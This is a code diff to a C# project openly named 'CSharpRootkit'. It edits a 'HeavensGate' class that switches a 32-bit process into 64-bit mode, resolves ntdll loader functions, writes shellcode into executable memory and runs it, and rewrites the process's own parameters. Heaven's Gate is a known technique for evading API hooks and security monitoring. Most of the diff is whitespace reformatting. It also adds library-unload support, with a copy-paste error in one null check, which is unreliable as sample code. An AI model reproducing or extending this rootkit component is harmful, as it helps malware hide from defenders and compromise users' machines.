@@ -9,50 +9,56 @@ namespace CSharpRootkit
 {
     public static class HeavensGate
     {
-        static HeavensGate() 
-		{
-			if (Environment.Is64BitProcess) 
-			{
-				return;
-			}
+        static HeavensGate()
+        {
+            if (Environment.Is64BitProcess)
+            {
+                return;
+            }
             CurrentProcessDuplicateHandle = NativeMethods.GetCurrentProcess();
-            if (!NativeMethods.DuplicateHandle(CurrentProcessDuplicateHandle, CurrentProcessDuplicateHandle, CurrentProcessDuplicateHandle, ref CurrentProcessDuplicateHandle, 0, false, 2)) 
+            if (!NativeMethods.DuplicateHandle(CurrentProcessDuplicateHandle, CurrentProcessDuplicateHandle, CurrentProcessDuplicateHandle, ref CurrentProcessDuplicateHandle, 0, false, 2))
             {
                 return;
             }
             ntdll64 = Utils64.GetRemoteModuleHandle64Bit(CurrentProcessDuplicateHandle, "ntdll.dll");
-            if (ntdll64==0)
+            if (ntdll64 == 0)
             {
-				return;
+                return;
             }
             LdrLoadDll = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrLoadDll");
-            if (LdrLoadDll==0)
+            if (LdrLoadDll == 0)
             {
-				return;
+                return;
+            }
+            LdrUnloadDll = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrUnloadDll");
+            if (LdrLoadDll == 0)
+            {
+                return;
             }
             LdrGetDllHandle = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrGetDllHandle");
-            if (LdrGetDllHandle==0)
+            if (LdrGetDllHandle == 0)
             {
                 return;
             }
             LdrGetProcedureAddress = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrGetProcedureAddress");
-            if (LdrGetProcedureAddress==0)
+            if (LdrGetProcedureAddress == 0)
             {
-				return;
+                return;
             }
-			operational = true;
+            operational = true;
         }
 
         public static bool operational = false;
 
         private static ulong LdrLoadDll;
+        private static ulong LdrUnloadDll;
         private static ulong LdrGetDllHandle;
         private static ulong LdrGetProcedureAddress;
         private static IntPtr CurrentProcessDuplicateHandle;
 
 
-		private static ulong ntdll64;
-        private static ulong Kernel3264=0;
+        private static ulong ntdll64;
+        private static ulong Kernel3264 = 0;
 
 
         private delegate ulong Wow64Execution(IntPtr func, IntPtr parameters);
@@ -103,9 +109,9 @@ namespace CSharpRootkit
         };
 
 
-        private static IntPtr UlongParamsToIntPtr(ulong[] parameters) 
-        { 
-            IntPtr ParamPtr=Marshal.AllocHGlobal(parameters.Length*sizeof(ulong));
+        private static IntPtr UlongParamsToIntPtr(ulong[] parameters)
+        {
+            IntPtr ParamPtr = Marshal.AllocHGlobal(parameters.Length * sizeof(ulong));
             for (int i = 0; i < parameters.Length; i++)
             {
                 byte[] ulongBytes = BitConverter.GetBytes(parameters[i]);
@@ -130,10 +136,10 @@ namespace CSharpRootkit
 
             Marshal.Copy(Wow64ExecuteShellCode, 0, pExecutableCode, Wow64ExecuteShellCode.Length);
             Marshal.Copy(code, 0, pExecutableCode + Wow64ExecuteShellCode.Length, code.Length);
-            
+
             bool Worked = NativeMethods.VirtualProtect(pExecutableCode, (UIntPtr)ShellCodeLength, PAGE_EXECUTE_READWRITE, out uint OldProtectValue);
 
-            if (!Worked) 
+            if (!Worked)
             {
                 throw new Exception("Couldnt set the shellcode memory as PAGE_EXECUTE_READWRITE!");
             }
@@ -253,7 +259,7 @@ namespace CSharpRootkit
             return DispatchX64Call(code.ToArray(), pFunctionParameters);
         }
 
-        private static ulong GetProcessParameters() 
+        private static ulong GetProcessParameters()
         {
             InternalStructs64.PROCESS_BASIC_INFORMATION64 PBI = new InternalStructs64.PROCESS_BASIC_INFORMATION64();
             uint PBI_size = (uint)Marshal.SizeOf(PBI);
@@ -262,7 +268,7 @@ namespace CSharpRootkit
             {
                 throw new Exception("couldnt read PBI from process!");
             }
-            ulong processParameters=GetProcessParameters64(PBI.PebBaseAddress);
+            ulong processParameters = GetProcessParameters64(PBI.PebBaseAddress);
 
             IntPtr ProcessParametersBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
             ulong len = 0;
@@ -289,7 +295,7 @@ namespace CSharpRootkit
             return addr + 0x20;
         }
 
-        private static InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 GetRTLParams() 
+        private static InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 GetRTLParams()
         {
             ulong processParameters = GetProcessParameters();
 
@@ -314,7 +320,7 @@ namespace CSharpRootkit
             return RTL_PARAMS;
         }
 
-        private static void WriteRTLParams(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS) 
+        private static void WriteRTLParams(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS)
         {
             ulong processParameters = GetProcessParameters();
 
@@ -324,24 +330,24 @@ namespace CSharpRootkit
             ulong len = 0;
             int WriteVirtualMemoryStatus = SpecialNativeMethods.WriteProcessMemory64From32(CurrentProcessDuplicateHandle, processParameters, RTL_PARAMS_PTR, (ulong)RTL_PARAMS_SIZE, ref len);
             Marshal.FreeHGlobal(RTL_PARAMS_PTR);
-            if (WriteVirtualMemoryStatus != 0) 
+            if (WriteVirtualMemoryStatus != 0)
             {
                 throw new Exception("Couldnt write the RTL_USER_PROCESS_PARAMETERS");
             }
         }
 
-        private static Tuple<ulong[], uint[]> CaptureConsoleHandles64() 
+        private static Tuple<ulong[], uint[]> CaptureConsoleHandles64()
         {
             InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS = GetRTLParams();
 
-            ulong[] handles = new ulong[] { RTL_PARAMS.ConsoleHandle, RTL_PARAMS.StandardInput, RTL_PARAMS.StandardOutput, RTL_PARAMS.StandardError};
+            ulong[] handles = new ulong[] { RTL_PARAMS.ConsoleHandle, RTL_PARAMS.StandardInput, RTL_PARAMS.StandardOutput, RTL_PARAMS.StandardError };
             uint[] flags = new uint[] { RTL_PARAMS.WindowFlags, RTL_PARAMS.ConsoleFlags };
 
             return new Tuple<ulong[], uint[]>(handles, flags);
 
         }
 
-        private static void WriteConsoleHandles64(ulong ConsoleHandle, ulong StandardInput, ulong StandardOutput, ulong StandardError, uint WindowFlags, uint ConsoleFlags) 
+        private static void WriteConsoleHandles64(ulong ConsoleHandle, ulong StandardInput, ulong StandardOutput, ulong StandardError, uint WindowFlags, uint ConsoleFlags)
         {
 
 
@@ -359,7 +365,7 @@ namespace CSharpRootkit
             WriteRTLParams(RTL_PARAMS);
         }
 
-        private static void WriteConsoleHandles64(ulong[] handle, uint[] flags) 
+        private static void WriteConsoleHandles64(ulong[] handle, uint[] flags)
         {
             if (handle.Length != 4 || flags.Length != 2)
             {
@@ -367,13 +373,13 @@ namespace CSharpRootkit
             }
             WriteConsoleHandles64(handle[0], handle[1], handle[2], handle[3], flags[0], flags[1]);
         }
-        public static ulong LoadKernel32() 
+        public static ulong LoadKernel32()
         {
             if (!operational)
             {
                 throw new Exception("HeavensGate did not start up properly or is on a x64 process");
             }
-            if (Kernel3264 != 0) 
+            if (Kernel3264 != 0)
             {
                 return Kernel3264;
             }
@@ -401,7 +407,7 @@ namespace CSharpRootkit
                     NativeMethods.VirtualProtect(subSystemAddress, (UIntPtr)Marshal.SizeOf(typeof(ushort)), oldProtect, out oldProtect);
                 }
             }
-            else 
+            else
             {
                 Kernel3264 = LoadLibrary64("kernel32.dll");
             }
@@ -418,7 +424,7 @@ namespace CSharpRootkit
             return Utils64.GetRemoteModuleHandle64Bit(CurrentProcessDuplicateHandle, ModuleName);
         }
 
-        public static ulong LoadLibrary64(string LibraryName)
+        public static ulong LoadLibrary64(string LibraryName, ulong flags = 0)
         {
             if (!operational)
             {
@@ -436,7 +442,7 @@ namespace CSharpRootkit
 
             IntPtr modulePtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(InternalStructs.ULONGRESULT)));
 
-            ulong result = Execute64(LdrLoadDll, 0, 0, (ulong)uniStr64Ptr, (ulong)modulePtr);
+            ulong result = Execute64(LdrLoadDll, 0, flags, (ulong)uniStr64Ptr, (ulong)modulePtr);
 
             ulong ModuleHandle = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(modulePtr).Value;
 
@@ -448,6 +454,11 @@ namespace CSharpRootkit
                 return 0;
             }
             return ModuleHandle;
+        }
+
+        public static bool FreeLibrary64(ulong ModuleHandle)
+        {
+            return Execute64(LdrUnloadDll, ModuleHandle) == 0;
         }
 
         public static ulong GetProcAddress64(ulong ModuleHandle, string FunctionName)
